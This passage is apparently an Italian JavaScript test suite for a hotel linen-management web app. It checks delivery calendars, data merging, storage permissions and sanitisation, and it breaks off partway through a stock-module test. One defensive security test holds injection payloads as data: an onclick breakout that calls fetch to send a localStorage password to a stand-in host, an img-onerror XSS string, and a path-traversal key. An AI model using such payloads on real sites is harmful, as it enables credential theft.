// Controlli su biancheria-galleria.html — Gestione Biancheria, l'app del Resident Manager
// per Art Resort e Art Suite Santa Brigida.
//
// Dall'11/09/2026 è una COPIA del modulo "Consumo Biancheria" di Compass (le funzioni
// sono le stesse, col prefisso gb/_gb/GB_ invece di bia/_bia/BIA_). Il modulo di Compass
// ha già i suoi controlli in test/controlli.js: qui si controlla ciò che nella copia è
// DIVERSO — i due calendari, il salvataggio solo locale, la lettura dei dati della
// versione semplificata — più le regole che
// devono restare identiche fra le due copie.
//
// Lo script della pagina viene caricato da test/node.js (e dal ramo osascript di
// esegui.sh) allo stesso modo di app.js: qui ci sono solo i casi.

sez('Gestione Biancheria (Galleria): copia di Compass, con due calendari');

function _gbQ(o) { var q = _gbVuote(); Object.keys(o || {}).forEach(function (k) { q[k] = o[k]; }); return q; }
function _gbReset() { _gb = { consumi: [], giri: [] }; _gbDist = {}; }

// ── Nessun nome in comune con Compass: le due copie vivono nello stesso spazio ──
//    Se la copia si chiamasse ancora biaRender, i controlli di Compass girerebbero sulla
//    funzione della Galleria senza accorgersene.
ok('Compass ha ancora le sue strutture',       Object.keys(BIA_HOTELS).join(','), 'sa,bh');
ok('la Galleria ha le sue',                    Object.keys(GB_HOTELS).join(','), 'ar,sb');
ok('le chiavi della Galleria sono bg_',        GB_KEY + ' ' + GB_DIST_KEY, 'bg_biancheria bg_distinte');

// ── I calendari sono DIVERSI per struttura ──
//    2026-09-14 è un lunedì. Pescare il calendario dell'altra struttura sposterebbe il
//    periodo di un giorno, cioè una giornata intera di consumi.
ok('Art Resort: il lunedì passa',              _gbGiornoGiro(new Date(2026, 8, 14), 'ar'), true);
ok('Art Resort: il martedì no',                _gbGiornoGiro(new Date(2026, 8, 15), 'ar'), false);
ok('Santa Brigida: il martedì passa',          _gbGiornoGiro(new Date(2026, 8, 15), 'sb'), true);
ok('Santa Brigida: il lunedì no',              _gbGiornoGiro(new Date(2026, 8, 14), 'sb'), false);
ok('vigilia di Santa Brigida: il lunedì',      _gbVigiliaGiro(new Date(2026, 8, 14), 'sb'), true);
ok('non di Art Resort',                        _gbVigiliaGiro(new Date(2026, 8, 14), 'ar'), false);
ok('Art Resort: prima di lun 14 c\'è ven 11',  _gbFmt(_gbGiroCalPrec(new Date(2026, 8, 14), 'ar')), '11/09/2026');
ok('Santa Brigida: prima di gio 17 c\'è mar 15', _gbFmt(_gbGiroCalPrec(new Date(2026, 8, 17), 'sb')), '15/09/2026');

// ── Il periodo: dalla consegna precedente (inclusa) al giorno PRIMA di questa ──
_gbReset();
_gb.giri.push({ id: 'c1', hotel: 'ar', data: '14/09/2026', consegnato: _gbQ({ Federa: 10 }), ricevuto: _gbQ({ Federa: 3 }), ts: 1 });
var _per = _gbPeriodo('ar', '16/09/2026');
ok('periodo: parte dalla consegna precedente', _gbFmt(_per.dal), '14/09/2026');
ok('periodo: arriva al giorno prima',          _gbFmt(_per.al),  '15/09/2026');
// Primo giro: comanda il calendario DELLA STRUTTURA. Per Santa Brigida il giro prima di
// sabato 19 è giovedì 17; col calendario di Art Resort sarebbe venerdì 18.
var _perSb = _gbPeriodo('sb', '19/09/2026');
ok('primo giro SB: calendario di Santa Brigida', _gbFmt(_perSb.dal), '17/09/2026');
ok('e lo dichiara',                            _perSb.fonte, 'calendario');
// Le strutture non si mescolano: la consegna di Art Resort non fa da "dal" a Santa Brigida.
ok('una consegna AR non tocca SB',             _gbPeriodo('sb', '17/09/2026').fonte, 'calendario');

// ── Regole identiche a Compass ──
// Uno zero mai inserito non è uno zero: sette zeri sono un modulo mai compilato.
ok('sette zeri: non registrato',               _gbRegistrato({ ricevuto: _gbVuote() }), false);
ok('un valore vero: registrato',               _gbRegistrato({ ricevuto: _gbQ({ Federa: 1 }) }), true);
_gb.giri.push({ id: 'c2', hotel: 'ar', data: '16/09/2026', consegnato: _gbQ({ Federa: 8 }), ricevuto: _gbQ({ Federa: 7 }), ts: 2 });
ok('atteso = sporco della consegna prima',     _gbTot(_gbAtteso('ar', '16/09/2026')), 10);
ok('saldo: ha riportato 7 su 10',              _gbTot(_gbSaldo('ar')), -3);

// ── Salvataggio SOLO locale, e lettura della versione semplificata ──
//    Fino all'11/09/2026 i giri si chiamavano "consegne" e le distinte stampate stavano
//    dentro l'archivio. Chi aveva già inserito qualcosa non deve perderlo.
var _mig = _gbMigra({ consumi: [{ id: 'x' }], consegne: [{ id: 'g' }], resi: [{ id: 'r' }] });
ok('vecchio formato: le consegne diventano giri', _mig.giri.length, 1);
ok('i consumi restano',                        _mig.consumi.length, 1);
ok('formato nuovo: si legge com\'è',           _gbMigra({ consumi: [], giri: [{ id: 'a' }, { id: 'b' }] }).giri.length, 2);
ok('niente: archivio vuoto',                   _gbMigra(null).giri.length, 0);

_gbReset();

// ── Il codice della Galleria apre SOLO le chiavi bg_* (worker.js) ──
//    È la ragione per cui i PC del Resident possono stare sul cloud di Compass senza vederne
//    l'archivio: ospiti, turni, cassa, dipendenti restano chiusi.
ok('Galleria: può leggere bg_biancheria',          permessoGalleria('/kv/get', 'bg_biancheria'), true);
ok('Galleria: può scrivere bg_distinte',           permessoGalleria('/kv/set', 'bg_distinte'), true);
ok('Galleria: NON legge gli ospiti',               permessoGalleria('/kv/get', 'qm_rcGuests'), false);
ok('Galleria: NON scrive la cassa',                permessoGalleria('/kv/set', 'qm_cassa_fondo'), false);
ok('Galleria: NON cancella, nemmeno le sue',       permessoGalleria('/kv/delete', 'bg_biancheria'), false);
ok('Galleria: NON elenca le chiavi',               permessoGalleria('/kv/chiavi', ''), false);
ok('Galleria: niente trucchi col prefisso',        permessoGalleria('/kv/get', 'bg_../qm_dvr'), false);
ok('Galleria: chiave vuota rifiutata',             permessoGalleria('/kv/get', ''), false);

// ── Due PC che salvano insieme non si cancellano il lavoro (fusione come in Compass) ──
var _fA = { consumi: [{ id: 'c1', data: '10/09/2026' }], giri: [] };              // PC 1
var _fB = { consumi: [{ id: 'c2', data: '11/09/2026' }], giri: [{ id: 'g1' }] };  // PC 2
var _f = _gbFondi(_fA, _fB);
ok('fusione: i consumi dei due PC ci sono entrambi', _f.consumi.map(function (x) { return x.id; }).sort().join(','), 'c1,c2');
ok('fusione: il giro del secondo PC resta',          _f.giri.length, 1);
// A parità di id vince questa postazione: è la correzione appena fatta a mano.
ok('fusione: vince la modifica di questo PC',        _gbFondi({ consumi: [{ id: 'x', v: 1 }], giri: [] }, { consumi: [{ id: 'x', v: 2 }], giri: [] }).consumi[0].v, 2);
// Un eliminato di proposito non torna dentro dalla copia dell'altro PC.
var _loc = _gbSegnaRimosso({ consumi: [], giri: [] }, 'c1');
ok('fusione: l\'eliminato non ritorna',              _gbFondi(_fA, _loc).consumi.length, 0);
// La versione precedente (consegne) si fonde come giri.
ok('fusione: legge anche il vecchio formato',        _gbFondi({ consumi: [], consegne: [{ id: 'v' }] }, { consumi: [], giri: [] }).giri.length, 1);

// ── Un totale congelato sbagliato si può riallineare (portato da Compass il 23/09/2026) ──
//    La correzione del 19/09 era entrata solo in Compass: qui mancava del tutto.
_gbReset();
_gb.consumi.push({ id: 'k1', hotel: 'ar', data: '14/09/2026', q: _gbQ({ Federa: 6 }) });
_gb.consumi.push({ id: 'k2', hotel: 'ar', data: '15/09/2026', q: _gbQ({ Federa: 4 }) });
_gb.giri.push({ id: 'r1', hotel: 'ar', data: '14/09/2026', consegnato: _gbQ({ Federa: 1 }), ricevuto: _gbQ({ Federa: 1 }), ts: 1 });
// Mercoledì 16: ritira lunedì 14 e martedì 15 = 10 federe. Registrato per sbaglio con 99.
var _gr = { id: 'r2', hotel: 'ar', data: '16/09/2026', consegnato: _gbQ({ Federa: 99 }), ricevuto: _gbQ({ Federa: 1 }), daiConsumi: _gbQ({ Federa: 99 }), ts: 2 };
_gb.giri.push(_gr);
ok('Galleria: somma del periodo col calendario AR',  _gbTot(_gbSommaDelGiro(_gr)), 10);
var _gsc = _gbScostamento(_gr);
ok('Galleria: il totale sbagliato si segnala',       !!_gsc, true);
ok('Galleria: dice di quanto',                       _gsc && _gsc.totCongelato + '→' + _gsc.totConsumi, '99→10');
_gbApplicaRiallineo(_gr, _gsc);
ok('Galleria: riallineato ai consumi',               _gbTot(_gr.consegnato), 10);
ok('Galleria: e ne resta traccia',                   (_gr.edits || []).length, 1);
ok('Galleria: poi l\'avviso si spegne',              _gbScostamento(_gr), null);
var _gm = { id: 'r3', hotel: 'ar', data: '16/09/2026', consegnato: _gbQ({ Federa: 50 }), ricevuto: _gbQ({}), daiConsumi: _gbQ({ Federa: 10 }) };
ok('Galleria: un totale scritto a mano non si segnala', _gbScostamento(_gm), null);
// La pagina si disegna con l'avviso e i due pulsanti (il codice nuovo passa di li').
_gr.consegnato = _gbQ({ Federa: 99 }); _gr.daiConsumi = _gbQ({ Federa: 99 }); _gr.edits = [];
_gbHotel = 'ar'; _gbGiroAperto = new Set([_gr.id]);
var _gbox = { innerHTML: '' }, _gvero = document.getElementById, _gerr = '';
document.getElementById = function (id) { return id === 'gb-content' ? _gbox : null; };
try { _gbRenderCore(); } catch (e) { _gerr = String(e); } finally { document.getElementById = _gvero; }
ok('Galleria: la pagina si disegna',                _gerr, '');
ok('Galleria: con il pulsante Riallinea',           /gbRiallineaGiro\('r2'\)/.test(_gbox.innerHTML), true);
ok('Galleria: e con Va bene così',                  /gbConfermaGiro\('r2'\)/.test(_gbox.innerHTML), true);
_gbGiroAperto = new Set();
_gbReset();
ok('Galleria: anche qui si vedono tutti i consumi', typeof gbToggleConsumiTutti, 'function');
ok('Galleria: totali del mese',                typeof gbPrintMese+typeof _gbMese, 'functionfunction');
var _ff = _gbFondi({ consumi: [], giri: [], fatture: { 'ar|2026-09': { q: { Federa: 5 } } } }, { consumi: [], giri: [], fatture: { 'ar|2026-09': { q: { Federa: '' , 'Telo doccia': 3 } } } });
ok('Galleria: la fattura sopravvive alla fusione',  _ff.fatture['ar|2026-09'].q['Telo doccia'], 3);
ok('Galleria: una casella svuotata resta vuota',    _ff.fatture['ar|2026-09'].q.Federa, '');
var _fi = _gbFondi({ consumi: [], giri: [], inizio: { ar: '18/09/2026' } }, { consumi: [], giri: [], inizio: { sb: '' } });
ok('Galleria: la data di inizio sopravvive alla fusione', _fi.inizio.ar + '|' + _fi.inizio.sb, '18/09/2026|');
ok('Galleria: la correzione dall\'altro PC arriva', _gbFondi({ consumi: [], giri: [{ id: 'g', ricevuto: { v: 20 }, ts: 2000 }] }, { consumi: [], giri: [{ id: 'g', ricevuto: { v: 620 }, ts: 1000 }] }).giri[0].ricevuto.v, 20);
ok('Galleria: senza orario vince questo PC',       _gbFondi({ consumi: [], giri: [{ id: 'g', v: 1 }] }, { consumi: [], giri: [{ id: 'g', v: 2 }] }).giri[0].v, 2);

// ── Reso Biancheria nella Galleria (25/09/2026): copia del modulo resi di Compass ──
ok('Reso Galleria: strutture proprie',             Object.keys(GR_HOTELS).join(','), 'ar,sb');
ok('Reso Galleria: chiave bg_',                    GR_KEY, 'bg_resi');
ok('Reso Galleria: Compass ha ancora le sue',      Object.keys(RESI_HOTELS).join(','), 'sa,bh');
ok('Reso Galleria: la chiave e\' ammessa dal Worker', permessoGalleria('/kv/set', GR_KEY), true);
(function () {
  var prima = _gr;
  _gr = { righe: [
    { id: 'r1', hotel: 'ar', data: '20/09/2026', tipologia: 'Federa', qta: 2, ritiroId: null },
    { id: 'r2', hotel: 'ar', data: '25/09/2026', tipologia: 'Federa', qta: 1, ritiroId: null },
    { id: 'r3', hotel: 'sb', data: '20/09/2026', tipologia: 'Federa', qta: 5, ritiroId: null }], ritiri: [], tipologie: null };
  // Stessa regola di Compass: al ritiro escono solo le righe PRIMA del giorno del ritiro.
  ok('Reso Galleria: al ritiro del 25/09 esce il 20/09', _grDaConsegnare('25/09/2026', 'ar').map(function (r) { return r.id; }).join(','), 'r1');
  _gr = prima;
})();
// Una consegna chiusa non torna aperta da una copia vecchia dell'altro PC (come in Compass).
ok('Reso Galleria: la chiusura resta',            _grUnisciRecord([{ id: 'x', ritiroId: null }], [{ id: 'x', ritiroId: 'R1' }])[0].ritiroId, 'R1');
ok('Reso Galleria: anche nell\'altro verso',       _grUnisciRecord([{ id: 'x', ritiroId: 'R1' }], [{ id: 'x', ritiroId: null }])[0].ritiroId, 'R1');
ok('Reso Galleria: la distinta va al Resident Manager', /Front Office Manager/.test(String(_grStampa)) && !/Presta/.test(String(_grStampa)), true);

// ── Menu laterale come Compass, con la voce Controllo fatturazione (25/09/2026) ──
ok('Galleria: nove voci di menu',                   Object.keys(BG_SEZIONI).join(','), 'consumo,conteggio,giacenza,reso,fattura,preferenze,statistiche,archivio,presenze');
// ── Conteggio Biancheria: modulo in costruzione, in attesa dei contratti (16/11/2026) ──
(function () {
  var box = { innerHTML: '' }, vero = document.getElementById;
  document.getElementById = function (id) { return id === 'gb-conteggio' ? box : null; };
  try { _gbRenderConteggio(); } finally { document.getElementById = vero; }
  ok('Galleria: Conteggio Biancheria in costruzione', /Modulo in costruzione/.test(box.innerHTML), true);
  ok('Galleria: cita le due strutture',               /Art Resort Galleria Umberto[\s\S]*Art Suite Santa Brigida/.test(box.innerHTML), true);
  ok('Galleria: firma d\'autore e uso interno',       /ideata e sviluppata da Pierpaolo Presta[\s\S]*Per esclusivo uso interno/.test(box.innerHTML), true);
  ok('Galleria: la voce apre il conteggio',           /_bgSezione==='conteggio'\)_gbRenderConteggio\(\)/.test(String(bgSezione)), true);
})();
(function () {
  var box = { innerHTML: '' }, fat = { innerHTML: '' }, vero = document.getElementById, prima = _gb;
  _gb = { consumi: [], giri: [{ id: 'g', hotel: 'ar', data: '21/09/2026', consegnato: _gbVuote(), ricevuto: _gbVuote(), ts: 1 }] };
  document.getElementById = function (id) { return id === 'gb-content' ? box : id === 'gb-fattura' ? fat : null; };
  var rev = GB_FATTURA_IN_REVISIONE, inRev;
  try {
    gbRender(); inRev = fat.innerHTML;
    GB_FATTURA_IN_REVISIONE = false; gbRender();
  } finally { document.getElementById = vero; _gb = prima; GB_FATTURA_IN_REVISIONE = rev; }
  ok('Galleria: il riscontro non sta piu\' nei consumi', /Riscontro fatturazioni/.test(box.innerHTML), false);
  ok('Galleria: sta in Controllo fatturazione',       /Riscontro fatturazioni/.test(fat.innerHTML), true);
  // In revisione dal 16/11/2026: pagina ferma al posto del riscontro, codice intatto.
  ok('Galleria: Controllo fatturazione in revisione',  GB_FATTURA_IN_REVISIONE, true);
  ok('Galleria: «Modulo in revisione»',                /Modulo in revisione/.test(inRev) && !/Riscontro fatturazioni/.test(inRev), true);
  ok('Galleria: prossima riattivazione con i contratti', /Prossima riattivazione con i contratti di fornitura di/.test(inRev) && /Per esclusivo uso interno/.test(inRev), true);
})();

// ── Cosa fare oggi per tutte e due le strutture, e segnali nel menu (25/09/2026) ──
(function () {
  var veroOggi = _gbOggi, prima = _gb, ph = _gbHotel;
  _gbOggi = function () { return new Date(2026, 8, 21); };   // lunedi': AR passa, SB e' alla vigilia
  _gb = { consumi: [], giri: [] }; _gbDist = {};
  var ar = _gbPassiOggi('ar'), sb = _gbPassiOggi('sb');
  ok('AR lunedi\': registrare cosa ha portato',      ar.passi.map(function (p) { return p.t; }).join('|').indexOf('Registra cosa ha portato') >= 0, true);
  ok('SB lunedi\': stampare la distinta',            sb.passi.some(function (p) { return p.dist; }), true);
  ok('AR lunedi\': nessuna distinta (non e\' vigilia)', ar.passi.some(function (p) { return p.dist; }), false);
  _gb.consumi.push({ id: 'k', hotel: 'sb', data: '21/09/2026', q: _gbVuote() });
  ok('SB con i consumi inseriti: spuntati',          _gbPassiOggi('sb').fatti.indexOf('Consumi di oggi inseriti') >= 0, true);
  var box = { innerHTML: '' }, vero = document.getElementById;
  document.getElementById = function (id) { return id === 'gb-content' ? box : null; };
  try { _gbHotel = 'ar'; _gbRenderCore(); } finally { document.getElementById = vero; }
  ok('il riquadro mostra tutte e due le strutture',  /Art Resort Galleria Umberto/.test(box.innerHTML) && /Art Suite Santa Brigida/.test(box.innerHTML), true);
  ok('e porta all\'altra struttura',                 /gbSetHotel\('sb'\)/.test(box.innerHTML) && /Passa a Santa Brigida/.test(box.innerHTML), true);
  document.getElementById = function (id) { return id === 'gb-content' ? box : null; };
  try { _gbHotel = 'sb'; _gbRenderCore(); } finally { document.getElementById = vero; }
  ok('"L\'ho già stampata" e\' un collegamento vero', /<a href="#" onclick="gbSegnaDistintaFatta\(event\)"/.test(box.innerHTML), true);
  _gbOggi = veroOggi; _gb = prima; _gbHotel = ph; _gbDist = {};
})();

// ── Storico del pulito: il passaggio mancanti − in piu' c'e' anche qui (26/09/2026) ──
(function () {
  var vG = _gbGiri, vR = _gbRigaGiro;
  _gbGiri = function () { return [{ data: '03/09/2026' }, { data: '05/09/2026' }]; };
  var val = { '03/09/2026': [66, 0], '05/09/2026': [0, 20] };
  _gbRigaGiro = function (g) { var v = val[g.data]; return { data: g.data, registrato: true, dovuto: 200 + v[0], portato: 200 + v[1] }; };
  try {
    var st = _gbStorico('ar', '2026-09');
    ok('Galleria storico: mancanti e in piu\'', st.meno + '/' + st.piu + '/' + st.saldo, '66/20/-46');
    ok('Galleria: la riga mostra il passaggio', _gbStoCompensa(st).replace(/<[^>]+>/g, ''), 'Nelle consegne: 66 pezzi mancanti − 20 in più = 46 mancanti');
  } finally { _gbGiri = vG; _gbRigaGiro = vR; }
})();

// ── Sicurezza: un dato scritto col codice della Galleria non porta codice sulla pagina (26/09/2026) ──
//    Sul PC del QM questa pagina gira col lasciapassare di Compass: un testo con <img onerror>
//    o un id con un apice (che esce dall'onclick) potrebbe leggerlo e spedirlo fuori.
(function () {
  var o = _gbJson(JSON.stringify({ consumi: [{ id: "x');fetch('//a.b?'+localStorage.qm_pass);('", hk: 'Maria <img src=x onerror=alert(1)>', motivo: "dell'ospite \"x\" `y`", ritiroId: "r1' onclick='z" }], fatture: { 'ar|2026-09<b>': { q: 3 } } }));
  var c = o.consumi[0];
  ok('sicurezza: l\'id perde apici e parentesi',  c.id, 'xfetcha.blocalStorage.qm_pass');
  ok('sicurezza: niente tag nei testi',           /[<>]/.test(c.hk), false);
  ok('sicurezza: l\'apostrofo italiano resta',    c.motivo, "dell'ospite x y");
  ok('sicurezza: anche i ...Id',                  c.ritiroId, 'r1onclickz');
  ok('sicurezza: le chiavi degli oggetti',        Object.keys(o.fatture).join(), 'ar|2026-09b');
  ok('sicurezza: i numeri restano numeri',        o.fatture['ar|2026-09b'].q, 3);
  ok('sicurezza: id normale intatto',             _gbJson('{"id":"1758800000000_ab12cd"}').id, '1758800000000_ab12cd');
})();

// Ultimo file caricato da esegui.sh/node.js: tocca a lui chiudere il conto.
riepilogo();

sez('Gestione Biancheria (Galleria): distinta solo con i consumi salvati');
// 06/11/2026: la distinta non si stampa se i consumi del periodo non sono tutti salvati.
(function () {
  var veroEl = document.getElementById, veroAv = _gbAvviso, avvisi = [], campi = {};
  _gbAvviso = function (t) { avvisi.push(t); };
  document.getElementById = function (id) { return campi[id] || null; };
  function giro(consumi, dataGiro) {
    _gb = { consumi: consumi.map(function (d) { return { id: d, hotel: 'ar', data: d, q: { Federa: 5 } }; }), giri: [] };
    _gbHotel = 'ar'; avvisi = [];
    campi['gb-giro-data'] = { value: dataGiro };
    campi['gb-cons-data'] = { value: '' };
  }
  try {
    // giro con due giorni nel periodo: manca il primo
    var dG = new Date(); dG.setDate(dG.getDate() + 30);
    while (!_gbPeriodo('ar', _gbFmt(dG)) || _gbGiorniPeriodo(_gbPeriodo('ar', _gbFmt(dG))).length < 2) dG.setDate(dG.getDate() + 1);
    var dataG = _gbFmt(dG), per = _gbPeriodo('ar', dataG), gg = _gbGiorniPeriodo(per).map(_gbFmt);
    giro(gg.slice(1), _gbToIso(dataG));
    gbPrintDistinta();
    ok('gb: giorno senza consumi, distinta bloccata', avvisi[0], 'Mancano dei consumi');
    giro(gg, _gbToIso(dataG));
    campi['gb-cons-data'] = { value: _gbToIso(gg[0]) };
    campi['gb-c-' + GB_VOCI.indexOf('Federa')] = { value: '9' };
    gbPrintDistinta();
    ok('gb: numeri scritti e non salvati, distinta bloccata', avvisi[0], 'Consumi non salvati');
    giro(gg, _gbToIso(dataG));
    ok('gb: tutto salvato, niente da salvare', JSON.stringify(_gbConsumiDaSalvare('ar', per)), '{"mancanti":[],"nonSalvato":null}');
  } finally { document.getElementById = veroEl; _gbAvviso = veroAv; }
})();

sez('Gestione Biancheria (Galleria): l\'avviso dei dati mancanti segue il calendario della struttura');
(function () {
  var prima = _gb;
  // 2026-11-07 e' un sabato. Art Resort passa lun/mer/ven, Santa Brigida mar/gio/sab.
  var oggi = new Date(2026, 10, 7);
  var g = function (h, d) { return { id: h + d, hotel: h, data: d, consegnato: _gbQ({ Federa: 3 }), ricevuto: _gbQ({ Federa: 3 }) }; };
  _gb = { consumi: [], giri: [g('ar', '02/11/2026'), g('ar', '06/11/2026'), g('sb', '03/11/2026'), g('sb', '05/11/2026')] };
  ok('Art Resort: manca mercoledi\' 04',     _gbBuchi('ar', oggi).consegne.join(','), '04/11/2026');
  ok('Santa Brigida: nessuna mancante',      _gbBuchi('sb', oggi).consegne.length, 0);
  _gb = prima;
})();

// ── Pulsante della consegna spento finché «Ha portato» non è guardato (12/11/2026) ──
(function () {
  var Q = function (n) { var q = _gbVuote(); q.Federa = n; return q; };
  var i = GB_VOCI.indexOf('Federa');
  var val = function (n) { return GB_VOCI.map(function (v, j) { return j === i ? String(n) : '0'; }); };
  var vuota = function () { var x = val(20); x[0] = ''; return x; };
  ok('Galleria: consegna nuova tutta scritta accesa',   _gbPuoRegistrare(false, Q(20), val(20)), true);
  ok('Galleria: consegna nuova con casella vuota spenta', _gbPuoRegistrare(false, Q(20), vuota()), false);
  ok('Galleria: già registrata invariata spenta',       _gbPuoRegistrare(true, Q(20), val(20)), false);
  ok('Galleria: già registrata cambiata accesa',        _gbPuoRegistrare(true, Q(20), val(25)), true);
  ok('Galleria: caselle vuote per la consegna nuova',   /att===null\?0:att/.test(String(_gbRenderCore))||!/ric===''/.test(String(_gbRenderCore)), false);
  ok('Galleria: niente spunta della distinta',          /corrispondono alla distinta|gb-conferma/.test(String(_gbRenderCore)), false);
  ok('Galleria: il pulsante nasce spento',              /id="gb-registra"[^>]*\$\{regOn\?'':'disabled'\}/.test(String(_gbRenderCore)), true);
  ok('Galleria: la casella aggiorna lo stato',          /_gbStatoRegistra\(\)/.test(String(gbAggiornaDelta)), true);
})();

// ── Numeri fuori dal normale: si riscrivono (12/11/2026). Copia identica di Compass. ──
(function () {
  var prima = _gb, ph = _gbHotel, vero = document.getElementById, pr = _gbRiscrivi;
  var Q = function (o) { var q = _gbVuote(); for (var k in o) q[k] = o[k]; return q; };
  var pad = function (n) { return (n < 10 ? '0' : '') + n; };
  var cons = []; for (var d = 1; d <= 20; d++) cons.push({ id: 'c' + d, hotel: 'ar', data: pad(d) + '/10/2026', q: Q({ 'Lenzuolo matrimoniale': 15, 'Federa': 30 }) });
  _gb = { consumi: cons, giri: [{ id: 'g1', hotel: 'ar', data: '20/10/2026', consegnato: Q({ 'Federa': 134 }), ricevuto: Q({ 'Federa': 130 }) }] };
  _gbHotel = 'ar';
  ok('Galleria: stesse soglie di Compass',         [GB_ANOM_GG, GB_ANOM_MIN_GG, GB_ANOM_FEDERE].join(' '), [BIA_ANOM_GG, BIA_ANOM_MIN_GG, BIA_ANOM_FEDERE].join(' '));
  ok('Galleria: 140 federe si ferma',              _gbAnomalieConsumi('ar', '21/10/2026', Q({ 'Lenzuolo matrimoniale': 15, 'Federa': 140 })).length, 1);
  ok('Galleria: un giorno normale passa',          _gbAnomalieConsumi('ar', '21/10/2026', Q({ 'Lenzuolo matrimoniale': 15, 'Federa': 30 })).length, 0);
  ok('Galleria: portato 5 federe (doveva 134)',    _gbAnomaliePortato('ar', '22/10/2026', Q({ 'Federa': 5 })).length, 1);
  var campi = { 'gb-cons-data': '2026-10-21' };
  GB_VOCI.forEach(function (v, i) { campi['gb-c-' + i] = v === 'Lenzuolo matrimoniale' ? '15' : '0'; });
  var iF = GB_VOCI.indexOf('Federa'); campi['gb-c-' + iF] = '140';
  document.getElementById = function (id) { return id in campi ? { value: campi[id] } : null; };
  _gbRiscrivi = { k: '', voci: {}, msg: [] };
  var trova = function () { return _gb.consumi.filter(function (c) { return c.data === '21/10/2026'; })[0]; };
  try { gbSalvaConsumi(); } catch (e) {}
  ok('Galleria: 140 federe non salvato',            !!trova(), false);
  campi['gb-c-' + iF] = '';
  try { gbSalvaConsumi(); } catch (e) {}
  ok('Galleria: casella vuota non vale zero',       !!trova(), false);
  campi['gb-c-' + iF] = '140';
  try { gbSalvaConsumi(); } catch (e) {}
  ok('Galleria: riscritto, salvato',                trova() && trova().q.Federa, 140);
  document.getElementById = vero;
  ok('Galleria: Ha portato in attesa nasce vuoto',  /v in rscR\?'':ric/.test(String(_gbRenderCore)), true);
  _gb = prima; _gbHotel = ph; _gbRiscrivi = pr;
})();

// ── Nessun conteggio prima del 01/09/2026, come in Compass (12/11/2026) ──
(function () {
  var prima = _gb, spento = GB_INIZIO_MINIMO;
  GB_INIZIO_MINIMO = _GB_MIN_VERO;
  ok('Galleria: stesso limite di Compass',        GB_INIZIO_MINIMO, _BIA_MIN_VERO);
  _gb = { consumi: [], giri: [], inizio: { ar: '01/08/2026' } };
  ok('Galleria: 01/08 scritto vale 01/09',        _gbInizioTxt('ar'), '01/09/2026');
  ok('Galleria: una data piu\' recente vale',     (_gb.inizio.ar = '10/09/2026', _gbInizioTxt('ar')), '10/09/2026');
  _gb = prima; GB_INIZIO_MINIMO = spento;
})();

// ── Consumi prima del 01/09 tolti, come in Compass (15/11/2026) ──
(function () {
  var prima = _gb, spento = GB_INIZIO_MINIMO;
  GB_INIZIO_MINIMO = _GB_MIN_VERO;
  var Q = function (n) { var q = _gbVuote(); q.Federa = n; return q; };
  _gb = { consumi: [{ id: 'a', hotel: 'ar', data: '30/08/2026', q: Q(10) }, { id: 'b', hotel: 'ar', data: '01/09/2026', q: Q(5) }],
          giri: [{ id: 'g', hotel: 'ar', data: '02/09/2026', consegnato: Q(15), daiConsumi: Q(15), ricevuto: Q(15) }] };
  ok('Galleria: tolto il consumo di agosto',      _gbTogliConsumiPrimaInizio(), 1);
  ok('Galleria: la consegna non cambia',          _gb.giri[0].consegnato.Federa, 15);
  ok('Galleria: nessun «Riallinea» acceso',       !!_gbScostamento(_gb.giri[0]), false);
  ok('Galleria: gbLoad la chiama',                /_gbTogliConsumiPrimaInizio\(\)\)\{await _gbSave\(\)/.test(String(gbLoad)), true);
  _gb = prima; GB_INIZIO_MINIMO = spento;
})();

// ── Frecce ‹ › sulle date (14/11/2026): la consegna segue il calendario della struttura
//    selezionata — Art Resort lun/mer/ven, Santa Brigida mar/gio/sab. 09/11/2026 e' lunedi'.
sez('Gestione Biancheria (Galleria): frecce sulle date');
(function () {
  var campi = { 'gb-cons-data': { value: '' }, 'gb-giro-data': { value: '' } }, vero = document.getElementById, ren = gbRender, h0 = _gbHotel;
  document.getElementById = function (id) { return campi[id] || null; };
  gbRender = function () {};
  try {
    _gbHotel = 'ar';
    campi['gb-giro-data'].value = '2026-11-09'; gbSpostaData('giro', 1);
    ok('Art Resort: da lunedi\' a mercoledi\'',     campi['gb-giro-data'].value, '2026-11-11');
    campi['gb-giro-data'].value = '2026-11-09'; gbSpostaData('giro', -1);
    ok('Art Resort: indietro al venerdi\'',         campi['gb-giro-data'].value, '2026-11-06');
    _gbHotel = 'sb';
    campi['gb-giro-data'].value = '2026-11-10'; gbSpostaData('giro', 1);
    ok('Santa Brigida: da martedi\' a giovedi\'',   campi['gb-giro-data'].value, '2026-11-12');
    campi['gb-giro-data'].value = '2026-11-09'; gbSpostaData('giro', 1);
    ok('Santa Brigida: dal lunedi\' al martedi\'',  campi['gb-giro-data'].value, '2026-11-10');
    campi['gb-cons-data'].value = '2026-11-10'; gbSpostaData('consumi', 1);
    ok('Galleria: consumi il giorno dopo',          campi['gb-cons-data'].value, '2026-11-11');
  } finally { document.getElementById = vero; gbRender = ren; _gbHotel = h0; }
})();

// Storico consegne del pulito chiuso di default, come in Compass (15/11/2026).
sez('Gestione Biancheria (Galleria): storico chiuso di default');
ok('Galleria: lo storico parte chiuso',          _gbStoAperto, false);
ok('Galleria: chiuso mostra solo l\'intestazione', /_gb\.giri\.length&&!_gbStoAperto/.test(String(gbRender)) || /_gb\.giri\.length&&!_gbStoAperto/.test(String(_gbRenderCore)), true);

// ── Giacenza Biancheria: copia del modulo di Compass (16/11/2026) ──
// Gli stessi controlli di test/controlli.js ("Giacenza biancheria: il magazzino si ancora al
// conteggio, il carico no"), col rinomino giac -> gc e le strutture della Galleria. In piu':
// due magazzini, chiave bg_, niente organico/turno di Compass, voce di menu.
sez('Giacenza Biancheria (Galleria): copia di Compass, due magazzini');
ok('Galleria: la voce Giacenza nel menu',   Object.keys(BG_SEZIONI).join(','), 'consumo,conteggio,giacenza,reso,fattura,preferenze,statistiche,archivio,presenze');
ok('Galleria: la voce apre la giacenza',    /_bgSezione==='giacenza'\)gcLoad\(\)/.test(String(bgSezione)), true);
(function () {
  var _g = _gc, _h = _gcHotel;
  var t = 1000;
  function mov(o) { o.id = 'm' + (++t); o.ts = t; o.hotel = o.hotel || 'ar'; return o; }
  _gcHotel = 'ar';
  _gc = { movimenti: [
    mov({ data: '01/09/2026', tipo: 'conteggio',    q: { Federa: 100, 'Telo doccia': 40 } }),
    mov({ data: '02/09/2026', tipo: 'prelievo',     persona: 'Rossi A.',  q: { Federa: 12, 'Telo doccia': 6 } }),
    mov({ data: '02/09/2026', tipo: 'prelievo',     persona: 'Bianchi G.', q: { Federa: 8 } }),
